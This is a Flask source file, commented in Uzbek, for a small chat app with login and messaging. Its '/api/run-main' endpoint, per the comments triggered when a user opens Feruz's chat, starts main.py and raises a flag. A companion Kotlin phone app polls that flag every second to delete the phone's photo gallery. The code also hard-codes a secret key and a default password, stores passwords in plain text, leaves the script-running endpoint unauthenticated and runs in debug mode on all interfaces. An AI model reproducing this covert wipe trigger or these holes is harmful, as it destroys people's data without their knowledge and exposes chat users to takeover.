import os
import subprocess
from flask import Flask, jsonify, render_template, request, session

app = Flask(__name__)
app.secret_key = 'feruz_secret_key_123'

# Bazalar va holatlar
users_db = {"Feruz": "feruz123"}  # Standart Feruz akkaunti
messages_db = []                  # Xabarlar ro'yxati

# Kotlin ilovasi uchun galereyani tozalash signali bayrog'i
delete_signal_flag = False

@app.route('/')
def index():
    return render_template('index.html')

# Ro'yxatdan o'tish
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if not username or not password:
        return jsonify({"success": False, "message": "Maydonlar bo'sh bo'lishi mumkin emas!"}), 400
    
    if username in users_db:
        return jsonify({"success": False, "message": "Bu foydalanuvchi allaqachon mavjud!"}), 400
    
    users_db[username] = password
    session['user'] = username
    return jsonify({"success": True, "username": username})

# Tizimga kirish
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    if username in users_db and users_db[username] == password:
        session['user'] = username
        return jsonify({"success": True, "username": username})
    
    return jsonify({"success": False, "message": "Login yoki parol xato!"}), 400

# Tizimdan chiqish
@app.route('/api/logout', methods=['POST'])
def logout():
    session.pop('user', None)
    return jsonify({"success": True})

# Avtorizatsiyani tekshirish
@app.route('/api/check-auth', methods=['GET'])
def check_auth():
    user = session.get('user')
    if user:
        return jsonify({"authenticated": True, "username": user})
    return jsonify({"authenticated": False})

# Ro'yxatdagi foydalanuvchilarni olish (Feruzni chiqarish uchun)
@app.route('/api/users', methods=['GET'])
def get_users():
    current_user = session.get('user')
    other_users = [u for u in users_db.keys() if u != current_user]
    return jsonify({"users": other_users})

# Chat xabarlarini boshqarish (GET va POST)
@app.route('/api/messages', methods=['GET', 'POST'])
def handle_messages():
    current_user = session.get('user')
    if not current_user:
        return jsonify({"error": "Avtorizatsiyadan o'tilmagan"}), 401

    if request.method == 'POST':
        data = request.json
        recipient = data.get('recipient')
        text = data.get('text')
        
        if text and recipient:
            msg = {
                "sender": current_user,
                "recipient": recipient,
                "text": text
            }
            messages_db.append(msg)
        return jsonify({"status": "success"})
    
    # Suhbatdoshi bo'yicha xabarlarni filtrlash
    chat_with = request.args.get('with')
    filtered_msgs = []
    for m in messages_db:
        if (m['sender'] == current_user and m['recipient'] == chat_with) or \
           (m['sender'] == chat_with and m['recipient'] == current_user):
            filtered_msgs.append(m)
            
    return jsonify({"messages": filtered_msgs})

# Feruz chatiga kirganda main.py ni ishga tushirish va signal berish
@app.route('/api/run-main', methods=['POST'])
def run_main_script():
    global delete_signal_flag
    try:
        if os.path.exists('main.py'):
            # 1. main.py ni ishga tushiramiz
            subprocess.Popen(['python', 'main.py'])
            
            # 2. Telefonga galereyani tozalash uchun signalni yoqamiz
            delete_signal_flag = True
            
            return jsonify({"status": "success", "message": "main.py ishga tushirildi va signal yuborildi!"})
        else:
            return jsonify({"status": "error", "message": "main.py topilmadi!"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# Kotlin ilovasi har sekundda tekshirib turadigan signal endpoint'i
@app.route('/api/check-signal', methods=['GET'])
def check_signal():
    global delete_signal_flag
    if delete_signal_flag:
        delete_signal_flag = False  # Signalni bir marta o'qigach, uni qayta o'chiramiz
        return jsonify({"delete": True})
    return jsonify({"delete": False})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)